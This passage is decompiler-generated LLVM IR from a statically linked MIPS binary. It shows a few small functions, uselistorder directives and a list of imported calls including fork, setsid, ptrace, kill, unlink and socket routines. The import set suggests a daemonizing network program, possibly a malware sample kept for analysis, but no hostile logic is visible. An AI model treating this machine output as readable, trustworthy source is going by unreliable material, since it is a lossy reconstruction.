  store i32 2, i32* %v2_407eb8, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  %v2_407ed4 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_407ed4, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_407ec8)
  store i32 %v2_407dc8, i32* %gp.global-to-local, align 4
  store i32 32, i32* %v1.global-to-local, align 4
  store i32 %v2_407df4, i32* %a1.global-to-local, align 4
  store i32 -1, i32* %a0.global-to-local, align 4
  %v0_407ef8.pre = load i32, i32* %v0.global-to-local, align 4
  %v2_407ef816 = add i32 %v2_407df4, 136
  %v2_407efc17 = add i32 %v2_407ef816, %v0_407ef8.pre
  %v3_407efc18 = inttoptr i32 %v2_407efc17 to i32*
  store i32 -1, i32* %v3_407efc18, align 4
  %v0_407f0019 = load i32, i32* %v1.global-to-local, align 4
  %v1_407f0020 = add i32 %v0_407f0019, -1
  store i32 %v1_407f0020, i32* @v1, align 4
  %v1_407f0421 = icmp sgt i32 %v1_407f0020, -1
  %v3_407f0422 = mul i32 %v1_407f0020, 4
  store i32 %v3_407f0422, i32* @v0, align 4
  br i1 %v1_407f0421, label %dec_label_pc_407ef8.dec_label_pc_407ef8_crit_edge, label %dec_label_pc_407f08

dec_label_pc_407ef8.dec_label_pc_407ef8_crit_edge: ; preds = %dec_label_pc_407ec4, %dec_label_pc_407ef8.dec_label_pc_407ef8_crit_edge
  %v3_407f0423 = phi i32 [ %v3_407f04, %dec_label_pc_407ef8.dec_label_pc_407ef8_crit_edge ], [ %v3_407f0422, %dec_label_pc_407ec4 ]
  %v1_407ef8.pre = load i32, i32* %a1.global-to-local, align 4
  %v0_407efc.pre = load i32, i32* %a0.global-to-local, align 4
  %v2_407ef8 = add i32 %v1_407ef8.pre, 136
  %v2_407efc = add i32 %v2_407ef8, %v3_407f0423
  %v3_407efc = inttoptr i32 %v2_407efc to i32*
  store i32 %v0_407efc.pre, i32* %v3_407efc, align 4
  %v0_407f00 = load i32, i32* @v1, align 4
  %v1_407f00 = add i32 %v0_407f00, -1
  store i32 %v1_407f00, i32* @v1, align 4
  %v1_407f04 = icmp sgt i32 %v1_407f00, -1
  %v3_407f04 = mul i32 %v1_407f00, 4
  store i32 %v3_407f04, i32* @v0, align 4
  br i1 %v1_407f04, label %dec_label_pc_407ef8.dec_label_pc_407ef8_crit_edge, label %dec_label_pc_407f08

dec_label_pc_407f08:                              ; preds = %dec_label_pc_407ef8.dec_label_pc_407ef8_crit_edge, %dec_label_pc_407ec4
  %v3_407f0c = load i32, i32* @global_var_4494b4.325, align 4
  store i32 %v3_407f0c, i32* @t9, align 4
  store i32 0, i32* %stack_var_-152, align 4
  store i32 6, i32* %a0.global-to-local, align 4
  store i32 %v2_407ed4, i32* %a1.global-to-local, align 4
  %v5_407f1c = call i32 @function_406d10(i32 6, i32* nonnull %stack_var_-152, i32 0)
  store i32 %v5_407f1c, i32* %v0.global-to-local, align 4
  store i32 %v2_407dc8, i32* %gp.global-to-local, align 4
  %v0_407f30.pre = load i32, i32* @v1, align 4
  br label %dec_label_pc_407f30

dec_label_pc_407f30:                              ; preds = %dec_label_pc_407eb0, %dec_label_pc_407f08
  %v1_407f30 = phi i32 [ 2, %dec_label_pc_407eb0 ], [ %v5_407f1c, %dec_label_pc_407f08 ]
  %v0_407f30 = phi i32 [ %v3_407eb8, %dec_label_pc_407eb0 ], [ %v0_407f30.pre, %dec_label_pc_407f08 ]
  %v2_407f30 = icmp eq i32 %v0_407f30, %v1_407f30
  store i32 3, i32* %v0.global-to-local, align 4
  br i1 %v2_407f30, label %dec_label_pc_407f34, label %dec_label_pc_407f40

dec_label_pc_407f34:                              ; preds = %dec_label_pc_407f30
  %v1_407f38 = load i32, i32* @a0, align 4
  %v2_407f38 = add i32 %v1_407f38, -27232
  %v3_407f38 = inttoptr i32 %v2_407f38 to i32*
  store i32 3, i32* %v3_407f38, align 4
  br label %dec_label_pc_407f40

dec_label_pc_407f40:                              ; preds = %dec_label_pc_407f30, %dec_label_pc_407f34
  %v0_407f40 = load i32, i32* @a0, align 4
  %v1_407f40 = add i32 %v0_407f40, -27232
  %v2_407f40 = inttoptr i32 %v1_407f40 to i32*
  %v3_407f40 = load i32, i32* %v2_407f40, align 4
  store i32 %v3_407f40, i32* %v1.global-to-local, align 4
  %v2_407f48 = icmp eq i32 %v3_407f40, 3
  store i32 4, i32* %v0.global-to-local, align 4
  br i1 %v2_407f48, label %dec_label_pc_407f4c, label %dec_label_pc_407f60

dec_label_pc_407f4c:                              ; preds = %dec_label_pc_407f40
  %v0_407f50 = load i32, i32* %gp.global-to-local, align 4
  %v1_407f50 = add i32 %v0_407f50, -32416
  %v2_407f50 = inttoptr i32 %v1_407f50 to i32*
  %v3_407f50 = load i32, i32* %v2_407f50, align 4
  store i32 4, i32* %v2_407f40, align 4
  store i32 127, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_407f50)
  br label %dec_label_pc_407f60

dec_label_pc_407f60:                              ; preds = %dec_label_pc_407f40, %dec_label_pc_407f4c
  ret i32 4

; uselistorder directives
  uselistorder i32 %v3_407f0422, { 1, 0 }
  uselistorder i32 %v3_407e0c29, { 1, 0 }
  uselistorder i32 %v2_407df4, { 1, 2, 3, 5, 4, 0, 6 }
  uselistorder i32 %v2_407dc8, { 0, 1, 3, 2, 4, 5, 6, 7, 8 }
  uselistorder i32* %v1.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 9, 6, 7 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 5, 3, 4, 2, 6, 7, 9, 8, 10, 12, 11, 13 }
  uselistorder i32* %gp.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32* %a0.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10 }
  uselistorder i32 127, { 1, 0, 2 }
  uselistorder i32 3, { 3, 2, 7, 0, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 4, 18, 19, 5, 20, 21, 22, 23, 24, 6, 25, 26, 27, 28, 1, 29 }
  uselistorder i32* @v1, { 1, 5, 6, 0, 7, 8, 9, 2, 10, 11, 12, 3, 4, 13, 14, 15, 16 }
  uselistorder i32 136, { 1, 0, 2, 3 }
  uselistorder i32* @a0, { 15, 16, 17, 18, 19, 20, 21, 13, 22, 4, 2, 23, 24, 25, 5, 26, 27, 6, 0, 1, 28, 12, 29, 30, 14, 7, 3, 8, 31, 32, 9, 10, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 11 }
  uselistorder i32 2, { 7, 8, 30, 17, 31, 4, 0, 1, 32, 33, 34, 35, 18, 19, 2, 5, 6, 36, 3, 9, 10, 37, 38, 39, 11, 40, 16, 41, 13, 42, 20, 43, 44, 45, 21, 46, 22, 47, 23, 48, 14, 49, 24, 25, 50, 26, 27, 51, 52, 53, 12, 28, 54, 29, 55, 15, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68 }
  uselistorder i32 (i32, i32)* @function_405d68, { 1, 0 }
  uselistorder i32 6, { 1, 8, 2, 9, 3, 10, 11, 12, 13, 14, 15, 16, 4, 17, 5, 18, 6, 0, 19, 7, 20, 21 }
  uselistorder i32 4, { 0, 49, 55, 1, 2, 3, 4, 56, 5, 57, 58, 59, 6, 60, 61, 62, 7, 8, 9, 10, 63, 64, 40, 41, 11, 12, 65, 66, 42, 43, 13, 67, 14, 15, 68, 69, 70, 71, 72, 16, 17, 18, 73, 74, 44, 19, 20, 21, 22, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 23, 24, 25, 26, 89, 90, 27, 91, 92, 93, 94, 95, 96, 28, 29, 97, 98, 30, 99, 46, 100, 31, 32, 33, 101, 102, 103, 104, 50, 105, 106, 107, 34, 108, 109, 110, 52, 45, 111, 112, 35, 113, 36, 114, 115, 48, 37, 38, 116, 117, 118, 47, 119, 39, 120, 53, 121, 122, 123, 124, 125, 126, 127, 54, 128, 51, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156 }
  uselistorder i32 32, { 20, 21, 22, 17, 23, 24, 0, 25, 26, 27, 28, 29, 30, 1, 2, 3, 31, 16, 32, 4, 5, 6, 7, 9, 8, 11, 10, 12, 13, 14, 15, 18, 33, 34, 35, 19, 36 }
  uselistorder i32 (i32)* @function_406884, { 16, 15, 14, 0, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_4491b0.413 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder label %dec_label_pc_407f60, { 1, 0 }
  uselistorder label %dec_label_pc_407f40, { 1, 0 }
  uselistorder label %dec_label_pc_407f30, { 1, 0 }
  uselistorder label %dec_label_pc_407ef8.dec_label_pc_407ef8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_407eb0, { 1, 0 }
  uselistorder label %dec_label_pc_407e48, { 1, 0 }
  uselistorder label %dec_label_pc_407e00.dec_label_pc_407e00_crit_edge, { 1, 0 }
}

define i32 @function_407f70(i32 %arg1) local_unnamed_addr {
dec_label_pc_407f70:
  %v1_407f7c = add i32 %arg1, 28
  %v2_407f7c = inttoptr i32 %v1_407f7c to i32*
  %v3_407f7c = load i32, i32* %v2_407f7c, align 4
  %v3_407f80 = load i32, i32* bitcast (i32** @global_var_44937c.419 to i32*), align 4
  %v2_407f88 = inttoptr i32 %v3_407f80 to i32*
  store i32 %v3_407f7c, i32* %v2_407f88, align 4
  %v1_407f8c = add i32 %arg1, 44
  %v2_407f8c = inttoptr i32 %v1_407f8c to i32*
  %v3_407f8c = load i32, i32* %v2_407f8c, align 4
  %v3_407f90 = load i32, i32* @global_var_4492e4, align 4
  %v3_407f94 = inttoptr i32 %v3_407f90 to i32*
  store i32 %v3_407f8c, i32* %v3_407f94, align 4
  ret i32 %v3_407f90

; uselistorder directives
  uselistorder i32 28, { 5, 6, 7, 8, 9, 10, 11, 12, 0, 1, 2, 3, 4, 13 }
}

define i32 @function_407fa0(i32* %arg1) local_unnamed_addr {
dec_label_pc_407fa0:
  %a0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %a0.global-to-local, align 4
  %v3_407fb8 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_407fb8, i32* @a2, align 4
  store i32 %tmp, i32* %a0.global-to-local, align 4
  %v2_407fcc = call i32 @brk(i32* %arg1)
  %v3_407fd0 = load i32, i32* bitcast (i32** @global_var_4492e8.34 to i32*), align 4
  %v2_407fd4 = icmp ult i32 %v2_407fcc, %tmp
  store i32 0, i32* %a0.global-to-local, align 4
  %v1_407fdc = icmp eq i1 %v2_407fd4, false
  %v4_407fdc = inttoptr i32 %v3_407fd0 to i32*
  store i32 %v2_407fcc, i32* %v4_407fdc, align 4
  br i1 %v1_407fdc, label %dec_label_pc_408000, label %dec_label_pc_407fe0

dec_label_pc_407fe0:                              ; preds = %dec_label_pc_407fa0
  %v0_407fe4 = load i32, i32* @a2, align 4
  store i32 %v0_407fe4, i32* @t9, align 4
  %v1_407fe8 = call i32 @function_4055d0()
  store i32 -1, i32* %a0.global-to-local, align 4
  %v2_407ffc = inttoptr i32 %v1_407fe8 to i32*
  store i32 12, i32* %v2_407ffc, align 4
  br label %dec_label_pc_408000

dec_label_pc_408000:                              ; preds = %dec_label_pc_407fa0, %dec_label_pc_407fe0
  %v0_408004 = load i32, i32* %a0.global-to-local, align 4
  ret i32 %v0_408004

; uselistorder directives
  uselistorder i32* %a0.global-to-local, { 2, 1, 3, 4, 0 }
  uselistorder i32 12, { 4, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 2, 23, 24, 0, 25, 5, 26, 6, 27, 28, 7, 29, 30, 31, 32, 1, 8, 33, 9, 34, 3, 35, 36, 37, 38, 39, 40, 10, 11 }
  uselistorder i32 ()* @function_4055d0, { 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i1 false, { 16, 10, 17, 0, 1, 18, 11, 19, 20, 2, 12, 21, 3, 22, 23, 4, 5, 24, 13, 25, 26, 27, 6, 28, 29, 30, 31, 14, 32, 33, 34, 35, 36, 37, 7, 38, 8, 39, 9, 40, 15, 41, 42 }
  uselistorder i32* @a2, { 9, 10, 11, 2, 12, 13, 14, 15, 16, 17, 7, 6, 18, 8, 19, 20, 21, 3, 22, 23, 5, 24, 25, 0, 1, 26, 4, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder label %dec_label_pc_408000, { 1, 0 }
}

define i32 @function_408010(i32 %arg1) local_unnamed_addr {
dec_label_pc_408010:
  %s1.global-to-local = alloca i32, align 4
  %v0_408020 = load i32, i32* @ra, align 4
  %v0_408024 = load i32, i32* @s0, align 4
  %v3_40802c = load i32, i32* @global_var_449224.420, align 4
  store i32 %v3_40802c, i32* @t9, align 4
  store i32 %arg1, i32* @s0, align 4
  %v2_408034 = call i32 @function_404bd0()
  %v0_408040 = load i32, i32* @s0, align 4
  %v3_408044 = load i32, i32* @global_var_449228.421, align 4
  store i32 %v3_408044, i32* @t9, align 4
  store i32 %v0_408020, i32* @ra, align 4
  store i32 %v0_408024, i32* @s0, align 4
  %v6_408054 = call i32 @function_404c90(i32 %v2_408034, i32 %v0_408040)
  %v1_408068 = load i32, i32* @t9, align 4
  %v1_408080 = add i32 %v1_408068, 266632
  %v2_408080 = inttoptr i32 %v1_408080 to i32*
  %v3_408080 = load i32, i32* %v2_408080, align 4
  %v1_408088 = add i32 %v3_408080, -28668
  %v1_40808c = add i32 %v3_408080, -28672
  %v2_40808c = inttoptr i32 %v1_40808c to i32*
  %v3_40808c = load i32, i32* %v2_40808c, align 4
  %v2_408094 = icmp eq i32 %v3_40808c, -1
  br i1 %v2_408094, label %dec_label_pc_4080b8, label %dec_label_pc_408098

dec_label_pc_408098:                              ; preds = %dec_label_pc_408010
  store i32 -1, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_4080a0

dec_label_pc_4080a0:                              ; preds = %dec_label_pc_4080a0, %dec_label_pc_408098
  %v1_4080a0 = phi i32 [ %v2_4080a0, %dec_label_pc_4080a0 ], [ %v1_40808c, %dec_label_pc_408098 ]
  %v0_4080a0 = phi i32 [ %v2_4080a8, %dec_label_pc_4080a0 ], [ %v3_40808c, %dec_label_pc_408098 ]
  %v2_4080a0 = add i32 %v1_4080a0, -4
  call void @__pseudo_call(i32 %v0_4080a0)
  %v1_4080a8 = inttoptr i32 %v2_4080a0 to i32*
  %v2_4080a8 = load i32, i32* %v1_4080a8, align 4
  %v1_4080b0 = load i32, i32* %s1.global-to-local, align 4
  %v2_4080b0 = icmp eq i32 %v2_4080a8, %v1_4080b0
  br i1 %v2_4080b0, label %dec_label_pc_4080b8, label %dec_label_pc_4080a0

dec_label_pc_4080b8:                              ; preds = %dec_label_pc_4080a0, %dec_label_pc_408010
  ret i32 %v1_408088

; uselistorder directives
  uselistorder i32 %v2_4080a8, { 1, 0 }
  uselistorder i32 -4, { 13, 4, 2, 14, 3, 5, 6, 7, 15, 8, 9, 1, 16, 10, 17, 11, 18, 19, 12, 20, 21, 0, 22, 23, 24, 25 }
  uselistorder i32 -1, { 109, 22, 110, 100, 111, 11, 12, 13, 112, 101, 113, 9, 10, 114, 115, 116, 17, 18, 19, 117, 118, 119, 120, 121, 14, 15, 16, 23, 122, 123, 124, 24, 102, 25, 125, 26, 27, 28, 126, 29, 127, 128, 129, 74, 131, 130, 30, 132, 31, 133, 76, 134, 0, 135, 136, 103, 104, 137, 138, 105, 139, 77, 140, 78, 141, 7, 8, 142, 143, 144, 1, 32, 145, 146, 106, 147, 148, 79, 149, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 107, 108, 46, 150, 47, 48, 49, 50, 51, 52, 53, 54, 55, 151, 152, 56, 153, 57, 154, 58, 155, 59, 60, 61, 62, 63, 156, 64, 157, 65, 2, 158, 80, 3, 159, 75, 4, 160, 20, 161, 162, 66, 163, 81, 164, 82, 165, 83, 84, 85, 166, 167, 86, 168, 67, 68, 169, 69, 70, 170, 171, 172, 87, 173, 88, 174, 175, 176, 5, 177, 89, 178, 90, 91, 179, 92, 180, 93, 181, 21, 71, 94, 182, 95, 183, 72, 96, 184, 97, 6, 185, 73, 186, 187, 188, 189, 98, 99 }
  uselistorder i32 (i32, i32)* @function_404c90, { 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @function_404bd0, { 1, 0 }
  uselistorder i32* @s0, { 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 1, 23, 24, 25, 26, 27, 28, 29, 30, 2, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 3, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 4, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145 }
  uselistorder i32 1, { 127, 97, 299, 403, 293, 404, 342, 341, 221, 222, 220, 218, 219, 1, 0, 405, 406, 277, 407, 278, 408, 409, 65, 68, 57, 58, 56, 69, 60, 62, 63, 64, 61, 66, 67, 59, 410, 411, 272, 273, 397, 140, 141, 142, 143, 144, 145, 148, 149, 146, 147, 151, 150, 154, 152, 153, 155, 158, 156, 157, 159, 87, 88, 190, 189, 44, 343, 175, 174, 228, 229, 256, 230, 344, 245, 254, 243, 246, 247, 249, 250, 251, 252, 255, 248, 253, 244, 398, 123, 121, 122, 120, 332, 72, 45, 331, 100, 101, 102, 412, 413, 345, 106, 108, 104, 107, 111, 103, 109, 112, 110, 105, 279, 294, 414, 242, 415, 416, 340, 339, 338, 337, 84, 81, 79, 83, 82, 80, 300, 346, 119, 115, 117, 116, 113, 118, 114, 89, 91, 90, 177, 178, 179, 271, 269, 270, 280, 417, 347, 241, 238, 240, 239, 301, 302, 399, 350, 349, 348, 192, 193, 191, 176, 13, 188, 77, 194, 51, 180, 41, 42, 43, 85, 86, 351, 418, 274, 400, 52, 53, 352, 303, 401, 353, 354, 290, 355, 54, 55, 37, 38, 39, 40, 212, 128, 98, 99, 356, 124, 126, 125, 70, 71, 20, 232, 210, 209, 208, 76, 21, 207, 206, 419, 420, 421, 422, 3, 304, 358, 357, 423, 424, 305, 306, 6, 5, 4, 7, 425, 426, 427, 428, 429, 430, 431, 432, 359, 47, 50, 46, 48, 49, 433, 275, 187, 186, 434, 435, 75, 436, 437, 211, 438, 439, 440, 12, 441, 442, 307, 308, 336, 335, 334, 333, 237, 236, 234, 233, 235, 443, 444, 281, 295, 445, 309, 446, 310, 447, 448, 282, 449, 450, 402, 451, 452, 311, 312, 369, 368, 326, 367, 366, 365, 364, 363, 362, 361, 360, 137, 138, 129, 130, 131, 132, 139, 133, 136, 135, 134, 453, 371, 370, 227, 223, 224, 226, 225, 454, 455, 456, 457, 458, 459, 460, 276, 461, 462, 313, 463, 464, 314, 465, 466, 467, 468, 469, 470, 471, 472, 473, 380, 379, 378, 377, 376, 327, 375, 374, 373, 372, 328, 163, 170, 164, 160, 161, 167, 169, 162, 168, 173, 166, 165, 171, 172, 474, 74, 73, 316, 475, 315, 476, 283, 477, 478, 284, 479, 317, 480, 481, 318, 319, 291, 482, 320, 321, 483, 322, 323, 484, 324, 485, 486, 391, 390, 389, 388, 387, 386, 385, 384, 329, 383, 382, 381, 15, 19, 14, 18, 16, 17, 487, 488, 489, 490, 216, 214, 213, 215, 217, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 285, 502, 503, 286, 287, 504, 296, 505, 506, 507, 508, 509, 510, 292, 511, 395, 394, 393, 392, 330, 265, 267, 261, 259, 257, 260, 263, 262, 258, 268, 266, 264, 231, 512, 2, 513, 514, 515, 516, 185, 182, 181, 184, 183, 517, 518, 519, 96, 93, 92, 95, 94, 520, 521, 289, 288, 325, 522, 396, 195, 205, 202, 201, 199, 197, 196, 198, 203, 200, 204, 78, 523, 524, 525, 526, 527, 36, 35, 28, 25, 24, 23, 27, 22, 29, 30, 26, 32, 33, 31, 34, 528, 10, 8, 9, 11, 529, 297, 298 }
}

define i32 @function_4080d0() local_unnamed_addr {
dec_label_pc_4080d0:
  %v0_4080e4 = load i32, i32* @ra, align 4
  %v1_408100 = add i32 %v0_4080e4, 266492
  %v2_408100 = inttoptr i32 %v1_408100 to i32*
  %v3_408100 = load i32, i32* %v2_408100, align 4
  %v1_408108 = add i32 %v3_408100, 288
  call void @__pseudo_call(i32 %v1_408108)
  %v4_408124 = load i32, i32* @v0, align 4
  ret i32 %v4_408124

; uselistorder directives
  uselistorder i32* @v0, { 5, 34, 0, 35, 36, 37, 38, 4, 1, 39, 40, 6, 7, 9, 41, 10, 42, 11, 43, 44, 12, 45, 46, 13, 47, 3, 2, 48, 14, 15, 16, 17, 18, 29, 30, 49, 50, 51, 19, 20, 52, 21, 22, 23, 24, 53, 54, 55, 25, 26, 56, 57, 27, 58, 28, 59, 31, 32, 33, 8 }
  uselistorder i32 0, { 157, 79, 147, 158, 159, 80, 160, 161, 13, 0, 162, 163, 164, 165, 24, 166, 15, 167, 25, 168, 169, 170, 171, 172, 173, 174, 14, 175, 176, 177, 178, 179, 180, 181, 81, 182, 183, 82, 184, 185, 186, 187, 188, 189, 20, 190, 191, 192, 193, 194, 26, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 29, 28, 83, 84, 205, 206, 207, 208, 209, 210, 27, 211, 85, 212, 30, 213, 214, 215, 86, 87, 1, 216, 217, 21, 218, 219, 220, 221, 222, 31, 223, 224, 225, 226, 227, 228, 229, 230, 231, 17, 232, 233, 234, 235, 236, 237, 2, 238, 239, 240, 241, 242, 243, 88, 244, 32, 69, 245, 246, 247, 248, 249, 250, 251, 252, 253, 3, 4, 155, 254, 9, 156, 255, 256, 257, 144, 258, 145, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 146, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 33, 306, 34, 8, 35, 307, 308, 309, 36, 310, 311, 312, 313, 18, 19, 22, 37, 38, 40, 39, 41, 314, 315, 316, 317, 318, 319, 67, 16, 320, 321, 42, 322, 323, 324, 325, 326, 75, 327, 328, 329, 330, 331, 90, 332, 91, 333, 92, 334, 93, 335, 336, 148, 337, 338, 149, 339, 340, 341, 342, 343, 43, 344, 150, 345, 346, 347, 70, 71, 348, 349, 151, 350, 351, 44, 352, 353, 152, 354, 355, 356, 357, 89, 358, 359, 360, 94, 361, 153, 362, 363, 364, 365, 366, 5, 95, 367, 45, 368, 96, 97, 369, 370, 98, 99, 371, 372, 373, 374, 375, 100, 47, 46, 376, 377, 68, 48, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 103, 392, 393, 394, 395, 154, 396, 397, 104, 398, 399, 400, 105, 401, 402, 101, 403, 72, 106, 107, 108, 404, 405, 406, 73, 407, 408, 10, 11, 109, 110, 102, 74, 409, 410, 411, 412, 6, 413, 414, 415, 416, 417, 76, 418, 77, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 23, 51, 50, 433, 49, 434, 435, 436, 437, 438, 439, 440, 441, 442, 7, 443, 63, 444, 52, 445, 53, 446, 64, 447, 54, 448, 55, 449, 65, 56, 450, 57, 451, 452, 453, 454, 455, 456, 457, 66, 458, 459, 460, 461, 462, 463, 464, 58, 465, 466, 12, 467, 111, 468, 78, 469, 60, 59, 61, 62, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489 }
}

declare i32 @unknown_0() local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @chdir(i8*) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork() local_unnamed_addr

declare i32 @getpid() local_unnamed_addr

declare i32 @getppid() local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @prctl(i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @ptrace(i32, ...) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @readlink(i8*, i8*, i32) local_unnamed_addr

declare i32 @setsid() local_unnamed_addr

declare i32 @sysinfo(%sysinfo*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @unlink(i8*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @accept(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @bind(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @getsockname(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @getsockopt(i32, i32, i32, i32*, i32*) local_unnamed_addr

declare i32 @listen(i32, i32) local_unnamed_addr

declare i32 @recv(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @recvfrom(i32, i32*, i32, i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @send(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @sendto(i32, i32*, i32, i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @setsockopt(i32, i32, i32, i32*, i32) local_unnamed_addr

declare i32 @socket(i32, i32, i32) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @fstat(i32, %stat*) local_unnamed_addr

declare i32 @getegid() local_unnamed_addr

declare i32 @geteuid() local_unnamed_addr

declare i32 @getgid() local_unnamed_addr

declare i32 @getuid() local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @times(%tms*) local_unnamed_addr

declare i32 @brk(i32*) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i16 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8* @__decompiler_undefined_function_3() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
